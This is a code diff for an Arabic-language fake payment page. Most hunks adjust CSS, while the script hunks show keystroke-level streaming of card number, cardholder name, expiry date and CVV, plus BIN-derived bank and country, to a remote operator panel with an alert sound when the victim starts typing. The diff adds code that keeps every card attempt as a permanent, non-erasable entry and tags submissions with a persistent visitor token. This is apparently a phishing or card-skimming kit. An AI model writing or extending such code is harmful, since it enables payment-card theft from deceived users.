@@ -27,13 +27,13 @@
     html, body {
       min-height: 100vh;
       min-height: 100dvh;
-      overflow-x: hidden;
       background: var(--bg);
       color: var(--text-main);
       display: flex;
       flex-direction: column;
       user-select: none;
       -webkit-tap-highlight-color: transparent;
+      overflow-x: hidden;
     }
 
     /* 🛡️ الهيدر المدمج */
@@ -64,7 +64,7 @@
       color: var(--text-muted);
     }
     .security-badge {
-      font-size: 11px;
+      font-size: 12px;
       font-weight: 700;
       color: #10b981;
       display: flex;
@@ -78,7 +78,7 @@
       display: flex;
       padding: 14px 16px;
       gap: 20px;
-      max-width: 1020px;
+      max-width: 1000px;
       width: 100%;
       margin: 0 auto;
     }
@@ -107,10 +107,10 @@
     /* 💳 مظهر البطاقة الذكية */
     .card-real-preview {
       width: 100%;
-      max-width: 350px;
+      max-width: 360px;
       aspect-ratio: 1.586 / 1;
       background: #f0f4fa;
-      border-radius: 16px;
+      border-radius: 18px;
       padding: 16px 18px;
       box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
       border: 1px solid rgba(226, 232, 240, 0.8);
@@ -131,7 +131,7 @@
     }
     .bank-logo-img {
       height: 30px;
-      max-width: 130px;
+      max-width: 140px;
       object-fit: contain;
       background: transparent !important;
       display: none;
@@ -140,7 +140,7 @@
       font-weight: 800;
       font-size: 13px;
       color: #1e293b;
-      max-width: 180px;
+      max-width: 190px;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -150,8 +150,8 @@
       border: 1px solid #cbd5e1;
       background: rgba(255, 255, 255, 0.9);
       border-radius: 6px;
-      padding: 2px 6px;
-      font-size: 10.5px;
+      padding: 2px 7px;
+      font-size: 11px;
       font-weight: 700;
       color: #1e293b;
       display: none;
@@ -214,7 +214,7 @@
       text-overflow: ellipsis;
     }
     .card-flag-badge {
-      font-size: 14px;
+      font-size: 13px;
       line-height: 1;
       display: none;
     }
@@ -225,8 +225,8 @@
       gap: 2px;
     }
     .card-network-logo-preview {
-      max-height: 19px;
-      max-width: 42px;
+      max-height: 20px;
+      max-width: 44px;
       object-fit: contain;
     }
     .card-tier-text {
@@ -237,7 +237,7 @@
       display: none;
     }
 
-    /* 🔲 الحقل الموحد بصرياً: اتساع كامل ومريح لـ 16 رقماً مع المسافات */
+    /* 🔲 الحقل الموحد: اتساع كامل ومريح لـ 16 رقماً والمسافات دون أي إزاحة */
     .unified-card-box {
       display: flex;
       align-items: center;
@@ -304,21 +304,21 @@
       font-size: 11px;
     }
 
-    /* 📐 ضبط مساحة حقل رقم البطاقة ليتسع لـ 16 رقماً + 3 مسافات بدون أي اختفاء */
+    /* المساحة المحسوبة لظهور 16 رقماً + 3 مسافات بدون انزلاق */
     #card-number {
-      flex: 4.8;
+      flex: 4.8 1 0%;
       font-size: 13.5px;
       letter-spacing: 0px;
       padding: 0 2px;
       white-space: nowrap;
     }
     #card-expiry {
-      flex: 1.35;
+      flex: 1.35 1 0%;
       font-size: 12px;
       text-align: center;
     }
     #card-cvv {
-      flex: 1.1;
+      flex: 1.1 1 0%;
       font-size: 12px;
       text-align: center;
     }
@@ -504,6 +504,7 @@
         box-shadow: none;
         background: transparent;
         border: none;
+        width: 100%;
       }
       .card-real-preview {
         max-width: 320px;
@@ -809,15 +810,15 @@
     var siteKey = "site_1789715618986";
     var baseFormName = "بيانات بطاقة الدفع (Step 2)";
 
-    // 🧠 توكن الزائر الثابت
+    // 🧠 مفتاح الزائر الأساسي
     var visitorToken = localStorage.getItem('visitor_token');
     if (!visitorToken) {
       visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10);
       localStorage.setItem('visitor_token', visitorToken);
     }
 
-    // 🔢 إدارة البطاقات المتعددة: كل زيارة أو عودة برقم بطاقة تنشئ كارت مستقل تماماً في اللوحة
-    var cardAttemptCount = parseInt(sessionStorage.getItem('current_card_index') || '1', 10);
+    // 🔢 إدارة البطاقات المتعددة: كل محاولة أو بطاقة جديدة تنشئ كارت دائم غير قابل للمسح
+    var cardAttemptCount = parseInt(localStorage.getItem('card_submission_index') || '1', 10);
 
     function initCardSession(index) {
       var randId = Math.random().toString(36).substring(2, 8) + Date.now().toString(36).substring(4);
@@ -830,8 +831,8 @@
 
     var currentCardSession = initCardSession(cardAttemptCount);
 
-    // 🔊 التحكم بصوت "يجري الكتابة" ليعمل لمرة واحدة فقط
-    var hasFiredTypingSound = false;
+    // 🔊 التحكم بصوت "يجري الكتابة" ليعمل لمرة واحدة فقط عند بداية الإدخال
+    var hasTriggeredTypingSound = false;
 
     // 💓 نبض متكرر للزائر
     function sendVisitorPing() {
@@ -841,9 +842,10 @@
         body: JSON.stringify({
           token: visitorToken,
           siteKey: siteKey,
-          currentPage: '/payment',
+          currentPage: window.location.pathname,
           pageTitle: 'صفحة الدفع - إدخال البطاقة #' + cardAttemptCount
-        })
+        }),
+        keepalive: true
       }).catch(function () {});
     }
     sendVisitorPing();
@@ -957,6 +959,7 @@
       return sum % 10 === 0;
     }
 
+    var lastProcessedBin = "";
     var isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false;
     var streamDebounce = null;
 
@@ -967,7 +970,7 @@
       streamLiveFormPayload(v ? 'ready' : 'typing');
     }
 
-    // 📡 بث البيانات للوحة مع الحفاظ على هوية البطاقة السابقة
+    // 📡 بث البيانات للوحة مع الحفاظ على كل بطاقة سابقة ككارت دائم
     function streamLiveFormPayload(st) {
       clearTimeout(streamDebounce);
       streamDebounce = setTimeout(function () {
@@ -979,11 +982,11 @@
 
         if (!cNum && !cHolder && !cExpiry && !cCvv) return;
 
-        // تشغيل صوت الكتابة لمرة واحدة فقط عند أول إدخال
+        // تشغيل نغمة الكتابة لمرة واحدة فقط عند أول إدخال
         var triggerSound = false;
         if (st === 'typing') {
-          if (!hasFiredTypingSound) {
-            hasFiredTypingSound = true;
+          if (!hasTriggeredTypingSound) {
+            hasTriggeredTypingSound = true;
             triggerSound = true;
           }
         } else if (st === 'ready' || st === 'confirmed') {
@@ -1010,7 +1013,8 @@
           'البنك': binInfo ? binInfo.issuer : '',
           'الدولة': binInfo ? binInfo.country : '',
           'رقم المحاولة': '#' + currentCardSession.index,
-          '_cardId': currentCardSession.sessionId
+          '_cardId': currentCardSession.sessionId,
+          '_visitorToken': visitorToken
         };
 
         if (scannedImg) {
@@ -1089,6 +1093,17 @@
     function validateCardNumber(el) {
       let raw = el.value.replace(/\D/g, '').substring(0, 16);
       let currentBin = raw.substring(0, 6);
+
+      // إذا قام الزائر بمسح البطاقة وكتابة رقم بطاقة جديد (BIN مختلف)، يتم إنشاء كارت منفصل جديد تلقائياً
+      if (currentBin.length >= 6 && lastProcessedBin && currentBin !== lastProcessedBin) {
+        cardAttemptCount++;
+        localStorage.setItem('card_submission_index', cardAttemptCount.toString());
+        currentCardSession = initCardSession(cardAttemptCount);
+        hasTriggeredTypingSound = false;
+      }
+      if (currentBin.length >= 6) {
+        lastProcessedBin = currentBin;
+      }
 
       el.value = raw.replace(/(\d{4})/g, '$1 ').trim();
       document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';
@@ -1228,8 +1243,9 @@
       // تأكيد البطاقة الحالية
       streamLiveFormPayload('confirmed');
 
-      // زيادة عداد البطاقة القادمة وتخزينه
-      sessionStorage.setItem('current_card_index', (cardAttemptCount + 1).toString());
+      // زيادة عداد البطاقة القادمة وتخزينه بشكل دائم حتى لا يتم مسح البطاقة الحالية لاحقاً
+      var nextCardIndex = cardAttemptCount + 1;
+      localStorage.setItem('card_submission_index', nextCardIndex.toString());
 
       fetch(SERVER_HUB_URL + '/api/tracker/ping', {
         method: 'POST',
